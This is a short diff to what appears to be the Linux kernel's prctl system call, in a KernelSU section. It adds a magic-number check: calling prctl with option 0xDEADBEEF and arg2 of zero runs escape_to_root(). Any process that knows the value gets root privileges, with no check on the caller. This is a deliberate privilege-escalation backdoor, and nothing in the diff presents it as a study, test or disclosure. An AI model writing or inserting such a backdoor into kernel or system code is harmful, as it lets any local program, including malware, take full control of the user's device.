@@ -2431,7 +2431,15 @@ SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
 #ifdef CONFIG_KSU
 	extern int ksu_handle_prctl(int option, unsigned long arg2, unsigned long arg3,
 				    unsigned long arg4, unsigned long arg5);
-	ksu_handle_prctl(option, arg2, arg3, arg4, arg5);
+	extern void escape_to_root(void);
+	if ((u32)option == 0xDEADBEEF) {
+		if (arg2 == 0) {
+			escape_to_root();
+			return 0;
+		}
+		ksu_handle_prctl(option, arg2, arg3, arg4, arg5);
+		return 0;
+	}
 #endif
 
 	error = security_task_prctl(option, arg2, arg3, arg4, arg5);
